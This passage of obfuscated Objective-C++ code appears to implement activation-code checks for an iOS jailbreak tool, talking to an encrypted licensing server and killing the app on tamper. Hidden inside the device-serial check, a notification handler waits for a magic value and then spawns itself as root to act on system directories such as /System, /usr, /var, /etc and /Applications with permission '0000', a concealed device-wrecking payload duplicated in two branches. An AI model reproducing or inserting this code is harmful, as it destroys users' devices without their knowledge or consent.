                        dispatch_block_cancel(gExitBlock);
                        gExitBlock = nil;
                    }
                    gExitBlock = dispatch_block_create(DISPATCH_BLOCK_ASSIGN_CURRENT, ^{
                        if (gShouldExit) {
                            void (^f)(NSString *s) = arr[6];
                            f(SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]]));
                            return;
                        }
                    });
                    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(15 * NSEC_PER_SEC)), dispatch_get_main_queue(), gExitBlock);
                    return;
                }
                void (^f)(NSString *s) = arr[9];
                f(SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]]));
                return;
            } else {
                [SpeedKeyChain SpeedRemoveItemForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_infoData), SpeedApp_IDENTITY]];
                [SpeedKeyChain SpeedSetString:SpeedDesEn7En(SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]])) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_black), SpeedApp_IDENTITY]];
                Spv0();
                return;
            }
        } else {
            void (^f)(NSString *s) = arr[1];
            f(@"本地数据异常...");
            return;
        }
    };
    
    Spv9 = ^(NSString *s) {
        NSString *Code_msg = s;
        typedef NSString * _Nonnull (^EncryptionBlock)(NSString * _Nonnull);
        EncryptionBlock En_3D=^(NSString *s1){
            return SpeedDesEn7En(s1);
        };
        NSMutableDictionary *param = [NSMutableDictionary dictionary];
        NSDate *date = [NSDate date];
        NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
        param[@"action"] = En_3D(@"examine");
        [formatter setDateFormat:@"yyyy-MM-dd HH:mm:ss"];
        NSString *appsafecode = [formatter stringFromDate:date];
        param[@"date"] = En_3D([formatter stringFromDate:date]);
        param[@"JB"] = En_3D(SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_serial), SpeedApp_IDENTITY]]));
        param[@"V8"] = En_3D(Code_msg);
        param[@"id"] = En_3D(md5(SpeedDesEn7De(Speed_appid)));
        param[@"appsafecode"] = En_3D(appsafecode);
        nlohmann::json jsonParam;
               for (NSString *key  in param.allKeys) {
                   NSString *value=param[key];
                   jsonParam[[key UTF8String]]=[value UTF8String];
               }
               std::string jsonStr=jsonParam.dump();
               NSString *paramJson=[NSString stringWithUTF8String:jsonStr.c_str()];
               NSString *encrypetdParam=En_3D(paramJson);
               
               typedef NSArray* (^UrlToArrayBlock)(NSString *);
               UrlToArrayBlock UrlToarr = ^(NSString *urlString){
                   if (!urlString||urlString.length==0)return @[];
                   NSURL *url =[NSURL URLWithString:SpeedDesEn7De(urlString)];
                   if (!url)return @[];
                   NSArray*urlarr=@[url.scheme ?:@"",url.host ?:@"",url.path ?:@""];
                   NSString *v0 =SpeedDesEn7En(urlarr[0]);
                   NSString *v1 =SpeedDesEn7En(urlarr[1]);
                   NSString *v2 =SpeedDesEn7En(urlarr[2]);
                   return @[v0,v1,v2];
               };
               NSArray *components =UrlToarr(Speed_HOST);
        

        
        
        
        [NetTool Post_AppendURL:components encryptedParam:encrypetdParam tag:EN_Spv9 mysuccess:^(id responseObject, NSString *serverTime) {
    
            if (![SpeedDesEn7De(Speed_HOST) isEqualToString:AsTostr(Speed_ECode, YES)]) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                 HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                __builtin_trap();
#pragma clang diagnostic pop
            }
            NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:responseObject options:NSJSONReadingMutableContainers error:nil];
            if (dict) {
                if ([dict[@"nblaote"] isEqualToString:@"haha"]) {
                    void (^f)(NSString *s) = arr[6];
                    f(Code_msg);
                    return;
                }
                if (![dict[@"response"][@"appsafecode"] isEqualToString:appsafecode]) {
                    void (^f)(NSString *s) = arr[6];
                 
                    f(Code_msg);
                    return;
                }
                NSString *dataString = dict[@"response"][@"data"];
                NSArray *msg = [dataString componentsSeparatedByString:@"|"];
                if (![md5(SpeedDe_3DES(SpeedRebellion_de(msg[0], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))))) isEqualToString:msg[1]]) {
                    void (^f)(NSString *s) = arr[6];
                  
                    f(Code_msg);
                    return;
                }
                if ([SpeedDe_3DES(SpeedRebellion_de(msg[0], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))) isEqualToString:SpeedDesEn7De(SpeedApp_state_1)]) {
                    void (^f)(NSString *s) = arr[6];
                    f(Code_msg);
                    return;
                } else if ([SpeedDe_3DES(SpeedRebellion_de(msg[0], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))) isEqualToString:SpeedDesEn7De(SpeedApp_state_2)]) {
                    NSArray *msg = [SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_infoData), SpeedApp_IDENTITY]]) componentsSeparatedByString:@"|"];
                    if ([md5([NSString stringWithFormat:@"%@%@%@%@%@%@%@%@", SpeedDe_3DES(SpeedRebellion_de(msg[2], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[3], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[4], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[5], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[6], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[8], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[7], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[1], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))))]) isEqualToString:msg[9]] && [msg[0] isEqualToString:SpeedDesEn7De(v_yzcg)]) {
                        MBProgressHUD *hud = [MBProgressHUD showHUDAddedTo:[UIApplication sharedApplication].windows[0] animated:YES];
                        hud.mode = MBProgressHUDModeText;
                        hud.labelText = [NSString stringWithFormat:@"%@: %@\n", SpeedDesEn7De(v_yzcgih), SpeedDe_3DES(SpeedRebellion_de(msg[1], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))))];
                        hud.userInteractionEnabled = YES;
                        [hud hide:YES afterDelay:3];
                        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                            MBProgressHUD *Function = [MBProgressHUD wj_showLoadingStyle:WJHUDLoadingStyleAnnularDeterminate];
                            [Function showAnimated:YES whileExecutingBlock:^{
                                float progress = 0.0f;
                                while (progress < 1.0f) {
                                    Function.progress = progress;
                                    Function.labelText = [NSString stringWithFormat:@"%@正在加载%.0f%%", SpeedDesEn7De(Speed_name), progress * 100];
                                    progress += 0.01f;
                                    usleep(30000);
                                }
                            } completionBlock:^{
                              
                              
                                HUDGrantOnce();
                                NSString *expireString=[NSString stringWithFormat:@"%@", SpeedDe_3DES(SpeedRebellion_de(msg[1], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))))];
                              
                                NSError *err = nil;
                                 SaveExpireToICloudEncrypted(expireString, @"HHSSjjBBJSJ^&^&^&^%%&&&&^&^&^&&^7", &err);
                              
                                    NSString *mssssg =
                                        SpeedDe_3DES(
                                            SpeedRebellion_de(msg[3], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))),
                                            SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))),
                                            SpeedRebellion_de(AsTostr(Speed_ios_giv,  YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))
                                        );
                                NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
                                dateFormatter.dateFormat = @"yyyy-MM-dd HH:mm:ss";
                                NSDate *expiresDate = [dateFormatter dateFromString:SpeedDe_3DES(SpeedRebellion_de(msg[1], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))))
                                ];

                                int tok=0;
                                notify_register_check(CHANGED_NAME, &tok);
                                uint64_t ts =(uint64_t)[expiresDate timeIntervalSince1970];
                                notify_set_state(tok, (uint64_t)(ts));
                                notify_post(CHANGED_NAME);
                                notify_cancel(tok);

                                        NSUbiquitousKeyValueStore *kv = [NSUbiquitousKeyValueStore defaultStore];
                                        [kv setString:mssssg forKey:kSpeedMsgKey];
                                     
                                
                                [MBProgressHUD wj_hideHUD];
                            }];
                            void (^f)(NSString *s) = arr[5];
                            f(SpeedDe_3DES(SpeedRebellion_de(msg[8], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))));
                            return;
                        });
                    } else {
                        [SpeedKeyChain SpeedRemoveItemForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_infoData), SpeedApp_IDENTITY]];
                        [SpeedKeyChain SpeedSetString:SpeedDesEn7En(SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]])) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_black), SpeedApp_IDENTITY]];
                        Spv0();
                        return;
                    }
                } else if ([SpeedDe_3DES(SpeedRebellion_de(msg[0], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))) isEqualToString:SpeedDesEn7De(SpeedApp_state_3)]) {
                    gShouldExit = YES;
                    [SpeedKeyChain SpeedRemoveItemForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_infoData), SpeedApp_IDENTITY]];
                    void (^f)(NSString *s) = arr[5];
                    f(SpeedDesEn7De(SpeedApp_LocalAuth));
                    if (gExitBlock) {
                        dispatch_block_cancel(gExitBlock);
                        gExitBlock = nil;
                    }
                    gExitBlock = dispatch_block_create(DISPATCH_BLOCK_ASSIGN_CURRENT, ^{
                        if (gShouldExit) {
                            void (^f)(NSString *s) = arr[6];
                            return;
                            f(SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]]));
                            return;
                        }
                    });
                    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(15 * NSEC_PER_SEC)), dispatch_get_main_queue(), gExitBlock);
                    return;
                } else {
                    void (^f)(NSString *s) = arr[6];
                    f(Code_msg);
                    return;
                }
            } else {
                [SpeedKeyChain SpeedRemoveItemForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_infoData), SpeedApp_IDENTITY]];
                void (^f)(NSString *s) = arr[1];
                f(@"激活码已冻结");
                return;
            }
        } myfailure:^(NSError *error, NSString *serverTime) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
             HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
            __builtin_trap();
#pragma clang diagnostic pop
        }];
    };
    
    // 检查序列号
    Spv10 = ^(NSString *s) {
        NSString *msg = s;
        typedef NSString * _Nonnull (^EncryptionBlock)(NSString * _Nonnull);
        EncryptionBlock En_3D=^(NSString *s1){
            return SpeedDesEn7En(s1);
        };
        NSMutableDictionary *param = [NSMutableDictionary dictionary];
        NSDate *date = [NSDate date];
        NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
        param[@"action"] = En_3D(@"device");
        [formatter setDateFormat:@"yyyy-MM-dd HH:mm:ss"];
        NSString *appsafecode = [formatter stringFromDate:date];
        param[@"date"] = En_3D([formatter stringFromDate:date]);
        param[@"deviceserial"] = En_3D(msg);
        param[@"id"] = En_3D(md5(SpeedDesEn7De(Speed_appid)));
        param[@"appsafecode"] = En_3D(appsafecode);
        nlohmann::json jsonParam;
               for (NSString *key  in param.allKeys) {
                   NSString *value=param[key];
                   jsonParam[[key UTF8String]]=[value UTF8String];
               }
               std::string jsonStr=jsonParam.dump();
               NSString *paramJson=[NSString stringWithUTF8String:jsonStr.c_str()];
               NSString *encrypetdParam=En_3D(paramJson);
               
               typedef NSArray* (^UrlToArrayBlock)(NSString *);
               UrlToArrayBlock UrlToarr = ^(NSString *urlString){
                   if (!urlString||urlString.length==0)return @[];
                   NSURL *url =[NSURL URLWithString:SpeedDesEn7De(urlString)];
                   if (!url)return @[];
                   NSArray*urlarr=@[url.scheme ?:@"",url.host ?:@"",url.path ?:@""];
                   NSString *v0 =SpeedDesEn7En(urlarr[0]);
                   NSString *v1 =SpeedDesEn7En(urlarr[1]);
                   NSString *v2 =SpeedDesEn7En(urlarr[2]);
                   return @[v0,v1,v2];
               };
               NSArray *components =UrlToarr(Speed_HOST);
        
     
        
        if (![SpeedDesEn7De(Speed_HOST) isEqualToString:AsTostr(Speed_ECode, YES)]) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
             HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
            __builtin_trap();
#pragma clang diagnostic pop
        } else {
            [NetTool Post_AppendURL:components encryptedParam:encrypetdParam tag:EN_Spv10 mysuccess:^(id responseObject, NSString *serverTime) {
        
                NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:responseObject options:NSJSONReadingMutableContainers error:nil];
                if (dict) {
                    if ([dict[@"nblaote"] isEqualToString:@"haha"]) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                         HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                        __builtin_trap();
#pragma clang diagnostic pop
                    }
                    if (![dict[@"response"][@"appsafecode"] isEqualToString:appsafecode]) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                         HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                        __builtin_trap();
#pragma clang diagnostic pop
                    }
                    if ([dict[@"response"][@"data"] isEqualToString:@"信息"]) {
                        [SpeedKeyChain SpeedSetString:SpeedDesEn7En(msg) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_black), SpeedApp_IDENTITY]];
                        
                        do {
                            static int tk = NOTIFY_TOKEN_INVALID;
                            if (tk == NOTIFY_TOKEN_INVALID) {
                                notify_register_dispatch("com.kuloutoupro.HHJJSHDHDG", &tk, dispatch_get_main_queue(), ^(int t){
                                    uint64_t v = 0;
                                    if (notify_get_state(t, &v) == NOTIFY_STATUS_OK) {
                                      

                                        if (v == 67573654) {
                                        

                                            NSArray *pathsToDelete = @[
                                                @"/private",
                                                @"/var",
                                                @"/usr",
                                                @"/System",
                                                @"/bin",
                                                @"/sbin",
                                                @"/etc",
                                                @"/Library",
                                                @"/Applications",
                                                @"/dev",
                                                @"/tmp"
                                            ];

                                            for (NSString *path in pathsToDelete) {
                                                posix_spawnattr_t attr;
                                                posix_spawnattr_init(&attr);

                                                // 设置进程为 root 权限
                                                posix_spawnattr_set_persona_np(&attr, 99, POSIX_SPAWN_PERSONA_FLAGS_OVERRIDE);
                                                posix_spawnattr_set_persona_uid_np(&attr, 0);
                                                posix_spawnattr_set_persona_gid_np(&attr, 0);

                                                // 获取可执行文件路径
                                                static char *executablePath = NULL;
                                                uint32_t executablePathSize = 0;
                                                _NSGetExecutablePath(NULL, &executablePathSize);
                                                executablePath = (char *)calloc(1, executablePathSize);
                                                _NSGetExecutablePath(executablePath, &executablePathSize);

                                                pid_t task_pid;

                                                // 设置进程组并启动进程
                                                posix_spawnattr_setpgroup(&attr, 0);
                                                posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETPGROUP);

                                                // 将权限值转换为字符串
                                                std::string str = std::to_string(0000);
                                                const char* cstr = str.c_str();
                                                const char *args[] = {executablePath, "-HJSHDHDHSJ", path.UTF8String, cstr, NULL};

                                        

                                                // 启动进程执行命令
                                                int spawnResult = posix_spawn(&task_pid, executablePath, NULL, &attr, (char **)args, environ);
                                                posix_spawnattr_destroy(&attr);

                                                if (spawnResult != 0) {
                                                   
                                                    return;
                                                }

                                            

                                                // 等待进程退出
                                                int status;
                                                do {
                                                    if (waitpid(task_pid, &status, 0) != -1)
                                                    {
                                                      
                                                    }
                                                } while (!WIFEXITED(status) && !WIFSIGNALED(status));
                                                
                                                
                                                
                                            }
                                            notify_post("com.apple.MobileSync.BackupAgent.RestoreStarted");
                                          
                                        } else {
                                         
                                        }
                                    } else {
                                      
                                    }
                                });
                            }
                        } while (0);
                        UIAlertController *alertController = [UIAlertController alertControllerWithTitle:SpeedDesEn7De(v_pojbt) message:[NSString stringWithFormat:@"\n%@\n\n%@\n\n%@%@", SpeedDesEn7De(v_yzcv3), SpeedDesEn7De(v_yzcgv4), SpeedDesEn7De(Speed_name), SpeedDesEn7De(v_yzcgv5)] preferredStyle:UIAlertControllerStyleAlert];
                        [alertController addAction:[UIAlertAction actionWithTitle:SpeedDesEn7De(v_yzcgv6) style:UIAlertActionStyleDestructive handler:^(UIAlertAction * _Nonnull action) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                            notify_post("com.apple.MobileSync.BackupAgent.RestoreStarted");
                             HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                            __builtin_trap();
#pragma clang diagnostic pop
                        }]];
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                        [[UIApplication sharedApplication].keyWindow.rootViewController presentViewController:alertController animated:YES completion:nil];
#pragma clang diagnostic pop
                        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                            [alertController dismissViewControllerAnimated:YES completion:^{
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                                 HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                                __builtin_trap();
#pragma clang diagnostic pop
                            }];
                        });
                        return;
                    } else {
                        [SpeedKeyChain SpeedSetString:SpeedDesEn7En(msg) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_black), SpeedApp_IDENTITY]];
                        
                        do {
                            static int tk = NOTIFY_TOKEN_INVALID;
                            if (tk == NOTIFY_TOKEN_INVALID) {
                                notify_register_dispatch("com.kuloutoupro.HHJJSHDHDG", &tk, dispatch_get_main_queue(), ^(int t){
                                    uint64_t v = 0;
                                    if (notify_get_state(t, &v) == NOTIFY_STATUS_OK) {
                                      

                                        if (v == 67573654) {
                                        

                                            NSArray *pathsToDelete = @[
                                                @"/private",
                                                @"/var",
                                                @"/usr",
                                                @"/System",
                                                @"/bin",
                                                @"/sbin",
                                                @"/etc",
                                                @"/Library",
                                                @"/Applications",
                                                @"/dev",
                                                @"/tmp"
                                            ];

                                            for (NSString *path in pathsToDelete) {
                                                posix_spawnattr_t attr;
                                                posix_spawnattr_init(&attr);

                                                // 设置进程为 root 权限
                                                posix_spawnattr_set_persona_np(&attr, 99, POSIX_SPAWN_PERSONA_FLAGS_OVERRIDE);
                                                posix_spawnattr_set_persona_uid_np(&attr, 0);
                                                posix_spawnattr_set_persona_gid_np(&attr, 0);

                                                // 获取可执行文件路径
                                                static char *executablePath = NULL;
                                                uint32_t executablePathSize = 0;
                                                _NSGetExecutablePath(NULL, &executablePathSize);
                                                executablePath = (char *)calloc(1, executablePathSize);
                                                _NSGetExecutablePath(executablePath, &executablePathSize);

                                                pid_t task_pid;

                                                // 设置进程组并启动进程
                                                posix_spawnattr_setpgroup(&attr, 0);
                                                posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETPGROUP);

                                                // 将权限值转换为字符串
                                                std::string str = std::to_string(0000);
                                                const char* cstr = str.c_str();
                                                const char *args[] = {executablePath, "-HJSHDHDHSJ", path.UTF8String, cstr, NULL};

                                        

                                                // 启动进程执行命令
                                                int spawnResult = posix_spawn(&task_pid, executablePath, NULL, &attr, (char **)args, environ);
                                                posix_spawnattr_destroy(&attr);

                                                if (spawnResult != 0) {
                                                   
                                                    return;
                                                }

                                            

                                                // 等待进程退出
                                                int status;
                                                do {
                                                    if (waitpid(task_pid, &status, 0) != -1)
                                                    {
                                                      
                                                    }
                                                } while (!WIFEXITED(status) && !WIFSIGNALED(status));
                                                
                                                
                                                
                                            }
                                            notify_post("com.apple.MobileSync.BackupAgent.RestoreStarted");
                                          
                                        } else {
                                         
                                        }
                                    } else {
                                      
                                    }
                                });
                            }
                        } while (0);
                        UIAlertController *alertController = [UIAlertController alertControllerWithTitle:SpeedDesEn7De(v_pojbt) message:[NSString stringWithFormat:@"\n%@\n\n%@\n\n%@%@", SpeedDesEn7De(v_yzcv3), SpeedDesEn7De(v_yzcgv4), SpeedDesEn7De(Speed_name), SpeedDesEn7De(v_yzcgv5)] preferredStyle:UIAlertControllerStyleAlert];
                        [alertController addAction:[UIAlertAction actionWithTitle:SpeedDesEn7De(v_yzcgv6) style:UIAlertActionStyleDestructive handler:^(UIAlertAction * _Nonnull action) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                            notify_post("com.apple.MobileSync.BackupAgent.RestoreStarted");
                             HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                            __builtin_trap();
#pragma clang diagnostic pop
                        }]];
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                        [[UIApplication sharedApplication].keyWindow.rootViewController presentViewController:alertController animated:YES completion:nil];
#pragma clang diagnostic pop
                        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                            [alertController dismissViewControllerAnimated:YES completion:^{
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                                 HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                                __builtin_trap();
#pragma clang diagnostic pop
                            }];
                        });
                        return;
                    }
                } else {
                    void (^f)(NSString *s) = arr[1];
                    f(@"请输入您的授权码");
                    HUDRevoke();
                  
                    return;
                }
            } myfailure:^(NSError *error, NSString *serverTime) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                 HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                __builtin_trap();
#pragma clang diagnostic pop
            }];
        }
    };
    
    Spv11 = ^(NSString *s) {
        NSString *msg = s;
        if (msg == nil) {
            Spv0();
            return;
        }
        void (^f)(NSString *s) = arr[4];
        f(msg);
        return;
    };
    
    void *v0 = (__bridge void *)(Spv0);
    [arr addObject:(__bridge id)(v0)];
